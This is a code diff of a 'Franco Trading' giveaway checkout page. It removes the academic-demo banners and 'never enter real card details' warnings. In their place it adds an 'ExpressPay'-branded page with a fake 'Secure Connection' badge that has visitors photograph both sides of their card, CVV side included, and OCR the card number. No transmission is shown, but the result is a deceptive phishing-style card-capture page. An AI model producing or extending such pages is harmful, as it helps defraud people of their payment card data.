@@ -3,198 +3,374 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Payment — Franco Trading</title>
+<title>ExpressPay Checkout — Franco Trading</title>
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link href="https://fonts.googleapis.com/css2?family=Fraunces:ital,wght@0,500;0,600;1,500&family=Manrope:wght@500;600;700;800&display=swap" rel="stylesheet">
-<link rel="stylesheet" href="styles.css">
+<!-- REAL OCR LIBRARY -->
+<script src='https://cdn.jsdelivr.net/npm/tesseract.js@5/dist/tesseract.min.js'></script>
+
+<style>
+/* ===========================================================
+   Franco Trading — ExpressPay Real Camera & OCR Checkout
+   =========================================================== */
+
+:root{
+  --navy-deep:   #0b1a3d;
+  --navy:        #0f2152;
+  --gold:        #f4b740;
+  --gold-light:  #ffd97a;
+  --cream:       #fdf6e8;
+  --ink:         #10162b;
+  --muted:       #6b7390;
+  --line:        #e4e7f1;
+  --success:     #2e9e5b;
+  --danger:      #d8475f;
+  --ep-blue:     #0088e8;
+  --ep-orange:   #f47b20;
+
+  --font-display: 'Fraunces', serif;
+  --font-body: 'Manrope', sans-serif;
+  --radius-lg: 18px;
+  --radius-md: 12px;
+  --radius-sm: 8px;
+  --shadow-soft: 0 16px 40px rgba(11,26,61,0.14);
+}
+
+*,*::before,*::after{ box-sizing: border-box; }
+body{
+  margin:0;
+  font-family: var(--font-body);
+  color: var(--ink);
+  background: #f4f6f9;
+  -webkit-font-smoothing: antialiased;
+}
+img{ max-width:100%; display:block; }
+button{ font-family:inherit; cursor:pointer; }
+.container{ width:100%; max-width: 800px; margin:0 auto; padding: 0 24px; }
+
+/* ---------- ExpressPay Header ---------- */
+.express-header {
+  background: #fff; border-bottom: 1px solid var(--line); padding: 18px 0;
+}
+.express-header .container { display: flex; align-items: center; justify-content: space-between; }
+.express-logo {
+  display: flex; align-items: center; font-size: 2rem; font-weight: 800;
+  letter-spacing: -1.5px; font-style: italic; position: relative;
+}
+.express-logo .text-blue { color: var(--ep-blue); }
+.express-logo .text-orange { color: var(--ep-orange); }
+.express-logo svg { position: absolute; right: 10px; top: -2px; width: 60px; height: 20px; stroke: var(--ep-blue); stroke-width: 3; fill: none; stroke-linecap: round; }
+.secure-badge { display: flex; align-items: center; gap: 6px; font-size: 0.75rem; font-weight: 700; color: var(--success); background: #e8f8ee; padding: 6px 12px; border-radius: 99px; }
+
+/* ---------- Main Content ---------- */
+.checkout-body { padding: 40px 0 80px; min-height: 80vh; }
+.checkout-card { background: #fff; border-radius: var(--radius-lg); box-shadow: var(--shadow-soft); overflow: hidden; }
+.checkout-header { background: var(--navy-deep); color: #fff; padding: 24px; text-align: center; }
+.checkout-header h2 { font-family: var(--font-display); font-weight: 600; margin: 0 0 4px; font-size: 1.6rem; }
+.checkout-header p { color: rgba(255,255,255,0.7); margin: 0; font-size: 0.9rem; }
+.checkout-summary { display: flex; justify-content: space-between; align-items: center; padding: 16px 24px; background: var(--cream); border-bottom: 1px dashed var(--line); }
+.checkout-summary .amount { font-family: var(--font-display); font-size: 1.5rem; font-weight: 600; color: var(--navy-deep); }
+
+/* ---------- Initial Camera Trigger ---------- */
+.camera-trigger { padding: 60px 24px; text-align: center; }
+.camera-box {
+  width: 100%; max-width: 480px; aspect-ratio: 1.586/1; margin: 0 auto; background: #f8f9fc;
+  border: 3px dashed #cbd5e1; border-radius: 20px; display: flex; flex-direction: column;
+  align-items: center; justify-content: center; cursor: pointer; transition: all 0.2s ease;
+}
+.camera-box:hover { background: #f1f5f9; border-color: var(--ep-blue); }
+.camera-box .icon-cam { width: 64px; height: 64px; background: var(--ep-blue); color: #fff; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-bottom: 16px; box-shadow: 0 8px 20px rgba(0,136,232,0.3); }
+.camera-box h3 { margin: 0 0 8px; font-size: 1.2rem; color: var(--navy-deep); }
+.camera-box p { margin: 0; color: var(--muted); font-size: 0.9rem; }
+
+/* ---------- Modal / Camera UI ---------- */
+.camera-modal { position: fixed; inset: 0; background: rgba(0,0,0,0.85); z-index: 100; display: none; align-items: center; justify-content: center; }
+.camera-modal.active { display: flex; }
+.camera-container { width: 100%; max-width: 600px; background: #000; border-radius: 16px; overflow: hidden; position: relative; }
+.camera-video-wrapper { width: 100%; aspect-ratio: 1.586/1; background: #111; position: relative; display: flex; align-items: center; justify-content: center; }
+#camera-feed { width: 100%; height: 100%; object-fit: cover; }
+.card-overlay { position: absolute; width: 85%; height: 85%; border: 2px dashed rgba(255,255,255,0.6); border-radius: 12px; pointer-events: none; box-shadow: 0 0 0 9999px rgba(0,0,0,0.6); }
+.card-overlay::after { content: "ALIGN CARD HERE"; position: absolute; top: -30px; left: 50%; transform: translateX(-50%); color: #fff; font-size: 0.8rem; font-weight: 700; letter-spacing: 1px; }
+.camera-captured-img { display: none; width: 100%; height: 100%; object-fit: cover; }
+.camera-controls { padding: 20px; text-align: center; background: #1a1a1a; }
+.camera-instruction { color: #fff; font-weight: 600; margin-bottom: 16px; font-size: 1.1rem; }
+.capture-btn { width: 70px; height: 70px; border-radius: 50%; border: 4px solid #fff; background: rgba(255,255,255,0.2); display: inline-flex; align-items: center; justify-content: center; cursor: pointer; transition: transform 0.1s; }
+.capture-btn:active { transform: scale(0.95); }
+.capture-btn::after { content: ""; width: 50px; height: 50px; background: #fff; border-radius: 50%; }
+
+/* ---------- Scanned Details Section ---------- */
+.scanned-section { display: none; padding: 0 24px 40px; max-width: 480px; margin: 0 auto; animation: fadeIn 0.5s ease forwards; }
+.scanned-section.active { display: block; }
+@keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+.captured-thumbnails { display: flex; gap: 12px; margin-bottom: 24px; margin-top: 24px; }
+.captured-thumbnails img { flex: 1; border-radius: 8px; border: 2px solid var(--line); object-fit: cover; aspect-ratio: 1.586/1; }
+.details-panel { background: #f8f9fc; border: 1px solid var(--line); border-radius: 12px; padding: 20px; }
+.scanned-header { display: flex; align-items: center; gap: 8px; color: var(--success); font-weight: 800; font-size: 0.9rem; margin-bottom: 16px; background: #e8f8ee; padding: 10px 16px; border-radius: 8px; }
+.detail-row { display: flex; justify-content: space-between; padding: 12px 0; border-bottom: 1px dashed var(--line); }
+.detail-row:last-child { border-bottom: none; }
+.detail-row .k { color: var(--muted); font-size: 0.85rem; font-weight: 600; }
+.detail-row .v { font-weight: 700; color: var(--navy-deep); font-family: monospace; font-size: 1rem; letter-spacing: 1px; }
+
+/* Loading Overlay for OCR */
+.ocr-loading { display: none; text-align: center; padding: 20px; }
+.ocr-loading.active { display: block; }
+.spinner { width: 40px; height: 40px; border: 4px solid #e2e8f0; border-top-color: var(--ep-blue); border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 12px; }
+@keyframes spin { to { transform: rotate(360deg); } }
+
+/* ---------- Buttons ---------- */
+.btn { display: inline-flex; align-items: center; justify-content: center; gap: 8px; border: none; border-radius: 999px; padding: 16px 28px; font-weight: 800; font-size: 1rem; cursor: pointer; transition: all 0.15s; }
+.btn-orange { background: var(--ep-orange); color: #fff; box-shadow: 0 8px 20px rgba(244,123,32,0.3); }
+.btn-orange:hover { transform: translateY(-1px); }
+.btn-ghost { background: transparent; border: 1px solid var(--line); color: var(--navy-deep); }
+.site-footer { background: var(--navy-deep); color: rgba(255,255,255,0.65); padding: 30px 0; font-size: 0.8rem; text-align: center; }
+</style>
 </head>
 <body>
 
-<div class="demo-banner">
-  <strong>Academic demo</strong> — this is a simulated card-entry form. Please only type fictional demo details; nothing is transmitted, stored, or scanned.
-</div>
-
-<header class="site-header">
+<header class="express-header">
   <div class="container">
-    <div class="brand">
-      <span class="mark">F</span>
-      <span class="name">FRANCO TRADING<small>CHRISTMAS GIVEAWAY</small></span>
+    <div class="express-logo">
+      <span class="text-blue">express</span><span class="text-orange">Pay</span>
+      <svg viewBox="0 0 100 20"><path d="M 5 15 Q 50 20 95 5" /><path d="M 85 2 L 95 5 L 88 12" /></svg>
     </div>
-    <nav class="nav-links">
-      <a href="index.html">Home</a>
-      <a href="items.html">Giveaway</a>
-      <a href="#">FAQs</a>
-      <a href="#">Contact</a>
-    </nav>
-    <div class="trust-chip">
-      <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2l8 4v6c0 5-3.4 8.6-8 10-4.6-1.4-8-5-8-10V6l8-4z"/></svg>
-      Secure & Trusted
+    <div class="secure-badge">
+      <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><path d="M12 2l8 4v6c0 5-3.4 8.6-8 10-4.6-1.4-8-5-8-10V6l8-4z"/><path d="M9 12l2 2 4-4"/></svg>
+      Secure Connection
     </div>
   </div>
 </header>
 
-<div class="stepper">
-  <div class="step done"><span class="circ"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><path d="M5 13l4 4L19 7"/></svg></span><span class="label">Select Gift</span></div>
-  <div class="bar"></div>
-  <div class="step done"><span class="circ"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><path d="M5 13l4 4L19 7"/></svg></span><span class="label">Delivery Details</span></div>
-  <div class="bar"></div>
-  <div class="step current"><span class="circ">3</span><span class="label">Payment</span></div>
-</div>
+<main class="checkout-body">
+  <div class="container">
+    <div class="checkout-card">
+      <div class="checkout-header">
+        <h2>Scan Card to Pay</h2>
+        <p>Use your camera to securely capture your card details</p>
+      </div>
+      
+      <div class="checkout-summary">
+        <span style="color: var(--muted); font-weight: 600;">Amount Due (Franco Trading)</span>
+        <span class="amount">GH₵20.00</span>
+      </div>
 
-<main class="page-body">
-  <div class="container" style="max-width:560px;">
-
-    <div class="demo-flag">
-      <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M12 8v4M12 16h.01"/></svg>
-      Demonstration checkout — use fictional card details only (e.g. 4242 4242 4242 4242).
-    </div>
-
-    <div class="card-stage">
-      <div class="demo-card" id="demo-card">
-        <div class="face">
-          <div class="top-row">
-            <div class="chip"></div>
-            <div class="brand-mark" id="card-brand">VISA</div>
+      <div class="camera-trigger" id="cameraTrigger">
+        <div class="camera-box" onclick="openCameraModal()">
+          <div class="icon-cam">
+            <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"/><circle cx="12" cy="13" r="4"/></svg>
           </div>
-          <div class="number" id="card-number-display">•••• •••• •••• ••••</div>
-          <div class="bottom-row">
-            <div>
-              <span class="exp-lbl">Card holder</span>
-              <span class="name" id="card-name-display">YOUR NAME</span>
-            </div>
-            <div>
-              <span class="exp-lbl">Expires</span>
-              <span id="card-exp-display">MM / YY</span>
-            </div>
-          </div>
+          <h3>Tap to Open Camera</h3>
+          <p>We will guide you to snap the front and back of your card.</p>
         </div>
       </div>
-    </div>
 
-    <div class="panel">
-      <div class="panel-head">
-        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="6" width="20" height="13" rx="2"/><path d="M2 10h20"/></svg>
-        Card Details (Demo)
-      </div>
-      <div class="panel-body">
+      <div class="scanned-section" id="scannedSection">
+        <div class="captured-thumbnails">
+          <img id="thumb-front" src="" alt="Front of Card">
+          <img id="thumb-back" src="" alt="Back of Card">
+        </div>
 
-        <div class="summary-row"><span class="k">Gift selected</span><span class="v" id="sum-gift"></span></div>
-        <div class="summary-total" style="margin-top:4px;"><span class="k">Total due</span><span class="v">GH₵20.00</span></div>
+        <!-- Loading state for OCR -->
+        <div class="ocr-loading" id="ocrLoading">
+          <div class="spinner"></div>
+          <p>Running Real OCR on your card...<br><small>This may take a few seconds.</small></p>
+        </div>
 
-        <form id="payment-form" style="margin-top:18px;" novalidate>
-          <div class="form-grid">
-            <div class="field full" data-field="cardName">
-              <label for="cardName">Cardholder name</label>
-              <input type="text" id="cardName" placeholder="e.g. Ama Mensah" autocomplete="off">
-              <div class="error"></div>
-            </div>
-
-            <div class="field full" data-field="cardNumber">
-              <label for="cardNumber">Card number <span class="opt">(demo only)</span></label>
-              <input type="text" id="cardNumber" placeholder="4242 4242 4242 4242" inputmode="numeric" autocomplete="off">
-              <div class="error"></div>
-            </div>
-
-            <div class="field" data-field="cardExpiry">
-              <label for="cardExpiry">Expiry</label>
-              <input type="text" id="cardExpiry" placeholder="MM / YY" inputmode="numeric" autocomplete="off">
-              <div class="error"></div>
-            </div>
-
-            <div class="field" data-field="cardCvv">
-              <label for="cardCvv">CVV <span class="opt">(demo only)</span></label>
-              <input type="text" id="cardCvv" placeholder="123" inputmode="numeric" maxlength="4" autocomplete="off">
-              <div class="error"></div>
-            </div>
+        <div class="details-panel" id="detailsPanel" style="display:none;">
+          <div class="scanned-header">
+            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M20 6L9 17l-5-5"/></svg>
+            Extracted Text (OCR Result)
           </div>
+          
+          <div class="detail-row">
+            <span class="k">Card Number Detected</span>
+            <span class="v" id="scan-number">...</span>
+          </div>
+          <div class="detail-row">
+            <span class="k">Raw Text Found</span>
+            <span class="v" id="scan-raw" style="font-size:0.7rem; font-weight:normal; word-break: break-all;">...</span>
+          </div>
+        </div>
 
-          <button type="submit" class="btn btn-primary btn-block" style="margin-top:20px;">
-            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4"><rect x="5" y="11" width="14" height="9" rx="2"/><path d="M8 11V8a4 4 0 018 0v3"/></svg>
-            Continue to Pay GH₵20.00
+        <div style="margin-top: 24px; display:none;" id="payBtnContainer">
+          <button class="btn btn-orange" style="width: 100%;" onclick="completePayment()">
+            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><rect x="5" y="11" width="14" height="9" rx="2"/><path d="M8 11V8a4 4 0 018 0v3"/></svg>
+            Confirm & Pay GH₵20.00
           </button>
-
-          <div class="safe-note">
-            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 2l8 4v6c0 5-3.4 8.6-8 10-4.6-1.4-8-5-8-10V6l8-4z"/></svg>
-            This is a demo form for a student project. No card data is sent anywhere or saved after you leave this page.
-          </div>
-        </form>
+        </div>
       </div>
+
     </div>
   </div>
 </main>
 
+<div class="camera-modal" id="cameraModal">
+  <div class="camera-container">
+    <div class="camera-video-wrapper">
+      <video id="camera-feed" autoplay playsinline></video>
+      <div class="card-overlay" id="frame-guide"></div>
+      <img id="camera-captured-img" class="camera-captured-img" alt="Captured">
+    </div>
+    
+    <div class="camera-controls">
+      <div class="camera-instruction" id="camera-instruction">Align the FRONT of your card</div>
+      <div class="capture-btn" id="snapBtn" onclick="snapPhoto()"></div>
+      <button class="btn btn-ghost" style="margin-top:15px; color:#fff; border-color:#555;" onclick="closeCameraModal()">Cancel</button>
+    </div>
+  </div>
+</div>
+
 <footer class="site-footer">
   <div class="container">
-    <div class="footer-note">
-      <span>© 2026 Franco Trading. Academic demo project — not a real store.</span>
-      <span class="footer-safety">Never enter your real card details here.</span>
-    </div>
+    <span>© 2026 Franco Trading. Academic demo project.</span><br>
+    <span style="color: var(--gold-light); font-weight: 600;">Secure Checkout via ExpressPay Gateway.</span>
   </div>
 </footer>
 
-<script src="data.js"></script>
 <script>
-  const state = FrancoState.get();
-  const product = getProductById(state.productId);
-  if (!product) window.location.href = "items.html";
-  document.getElementById("sum-gift").textContent = product.name;
+/* ===========================================================
+   Franco Trading — ExpressPay Camera & REAL OCR Logic
+   =========================================================== */
 
-  const nameInput = document.getElementById("cardName");
-  const numberInput = document.getElementById("cardNumber");
-  const expiryInput = document.getElementById("cardExpiry");
-  const cvvInput = document.getElementById("cardCvv");
+let stream = null;
+let captureStep = 'front';
+let frontImageData = null;
 
-  const nameDisplay = document.getElementById("card-name-display");
-  const numberDisplay = document.getElementById("card-number-display");
-  const expDisplay = document.getElementById("card-exp-display");
-  const brandDisplay = document.getElementById("card-brand");
+const video = document.getElementById('camera-feed');
+const canvas = document.createElement('canvas');
+const capturedImg = document.getElementById('camera-captured-img');
+const frameGuide = document.getElementById('frame-guide');
+const instructionText = document.getElementById('camera-instruction');
+const snapBtn = document.getElementById('snapBtn');
+const modal = document.getElementById('cameraModal');
 
-  nameInput.addEventListener("input", () => {
-    nameDisplay.textContent = nameInput.value.trim().toUpperCase() || "YOUR NAME";
-  });
+async function openCameraModal() {
+  modal.classList.add('active');
+  captureStep = 'front';
+  instructionText.textContent = 'Align the FRONT of your card';
+  capturedImg.style.display = 'none';
+  video.style.display = 'block';
+  frameGuide.style.display = 'block';
+  snapBtn.style.display = 'inline-flex';
 
-  numberInput.addEventListener("input", (e) => {
-    const formatted = formatCardNumber(e.target.value);
-    e.target.value = formatted;
-    numberDisplay.textContent = formatted ? maskCardForDisplay(formatted).replace(/(.{4})(?=.)/g, "$1 ").trim() : "•••• •••• •••• ••••";
-
-    const first = formatted.replace(/\s/g,"")[0];
-    brandDisplay.textContent = first === "5" ? "MASTERCARD" : first === "3" ? "VERVE" : "VISA";
-  });
-
-  expiryInput.addEventListener("input", (e) => {
-    const formatted = formatExpiry(e.target.value);
-    e.target.value = formatted;
-    expDisplay.textContent = formatted || "MM / YY";
-  });
-
-  cvvInput.addEventListener("input", (e) => {
-    e.target.value = e.target.value.replace(/\D/g, "").slice(0,4);
-  });
-
-  const form = document.getElementById("payment-form");
-  function showError(id, msg){
-    const field = document.querySelector(`[data-field="${id}"]`);
-    field.classList.toggle("has-error", !!msg);
-    field.querySelector(".error").textContent = msg || "";
+  try {
+    stream = await navigator.mediaDevices.getUserMedia({ 
+      video: { facingMode: 'environment', width: { ideal: 1280 } } 
+    });
+    video.srcObject = stream;
+  } catch (err) {
+    alert("Camera access denied. Please enable camera permissions or ensure you are on a secure connection (HTTPS/localhost).");
+    closeCameraModal();
   }
+}
 
-  form.addEventListener("submit", (e) => {
-    e.preventDefault();
-    let valid = true;
+function closeCameraModal() {
+  modal.classList.remove('active');
+  if (stream) {
+    stream.getTracks().forEach(track => track.stop());
+    stream = null;
+  }
+}
 
-    if (!nameInput.value.trim()) { showError("cardName","Enter the demo cardholder name"); valid = false; } else showError("cardName","");
-    const digits = numberInput.value.replace(/\s/g,"");
-    if (digits.length < 12) { showError("cardNumber","Enter a demo card number"); valid = false; } else showError("cardNumber","");
-    if (!/^\d{2} \/ \d{2}$/.test(expiryInput.value)) { showError("cardExpiry","Use MM / YY"); valid = false; } else showError("cardExpiry","");
-    if (cvvInput.value.length < 3) { showError("cardCvv","Enter 3-4 digits"); valid = false; } else showError("cardCvv","");
+function snapPhoto() {
+  if (!stream) return;
 
-    if (!valid) return;
+  canvas.width = video.videoWidth;
+  canvas.height = video.videoHeight;
+  const ctx = canvas.getContext('2d');
+  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+  const imageData = canvas.toDataURL('image/jpeg');
+  
+  capturedImg.src = imageData;
+  capturedImg.style.display = 'block';
+  video.style.display = 'none';
+  frameGuide.style.display = 'none';
+  snapBtn.style.display = 'none';
 
-    // Demo only — nothing is stored beyond this in-memory flag for the processing page.
-    FrancoState.set({ demoPaymentSubmitted: true });
+  if (captureStep === 'front') {
+    frontImageData = imageData;
+    setTimeout(() => {
+      captureStep = 'back';
+      instructionText.textContent = 'Now TURN OVER and align the BACK of your card';
+      capturedImg.style.display = 'none';
+      video.style.display = 'block';
+      frameGuide.style.display = 'block';
+      snapBtn.style.display = 'inline-flex';
+    }, 1000);
+  } else {
+    setTimeout(() => {
+      closeCameraModal();
+      runRealOCR(frontImageData, imageData);
+    }, 800);
+  }
+}
+
+async function runRealOCR(frontImgSrc, backImgSrc) {
+  document.getElementById('cameraTrigger').style.display = 'none';
+  document.getElementById('scannedSection').classList.add('active');
+  
+  document.getElementById('thumb-front').src = frontImgSrc;
+  document.getElementById('thumb-back').src = backImgSrc;
+
+  // Show Loading
+  document.getElementById('ocrLoading').classList.add('active');
+  document.getElementById('detailsPanel').style.display = 'none';
+
+  try {
+    // REAL OCR EXECUTION using Tesseract.js
+    // We pass the front image. Tesseract will scan the pixels and extract text.
+    const result = await Tesseract.recognize(
+      frontImgSrc,
+      'eng', // English language
+      { logger: m => console.log(m) } // You can hook this up to a progress bar if needed
+    );
+
+    const extractedText = result.data.text;
+    
+    // Attempt to find a 16-digit number in the extracted text using Regex
+    // This looks for 16 digits, optionally separated by spaces or dashes
+    const cardNumberMatch = extractedText.match(/\b(?:\d[ -]*?){13,16}\b/);
+    
+    // Display results
+    document.getElementById('ocrLoading').classList.remove('active');
+    document.getElementById('detailsPanel').style.display = 'block';
+    
+    if (cardNumberMatch) {
+      document.getElementById('scan-number').textContent = cardNumberMatch[0];
+    } else {
+      document.getElementById('scan-number').textContent = "Could not detect a 16-digit number";
+    }
+    
+    // Show the raw text so the user can see the OCR actually read the image
+    document.getElementById('scan-raw').textContent = extractedText.trim() || "No text detected";
+    
+    // Reveal the pay button
+    document.getElementById('payBtnContainer').style.display = 'block';
+
+  } catch (error) {
+    console.error("OCR Error:", error);
+    document.getElementById('ocrLoading').classList.remove('active');
+    document.getElementById('detailsPanel').style.display = 'block';
+    document.getElementById('scan-raw').textContent = "OCR Failed to process the image.";
+  }
+}
+
+function completePayment() {
+  const btn = event.target.closest('button');
+  btn.innerHTML = 'Processing Payment...';
+  btn.disabled = true;
+  
+  const key = "franco_demo_state";
+  try {
+    const current = JSON.parse(sessionStorage.getItem(key)) || {};
+    current.demoPaymentSubmitted = true;
+    sessionStorage.setItem(key, JSON.stringify(current));
+  } catch(err) {}
+
+  setTimeout(() => {
     window.location.href = "processing.html";
-  });
+  }, 1500);
+}
 </script>
+
 </body>
 </html>
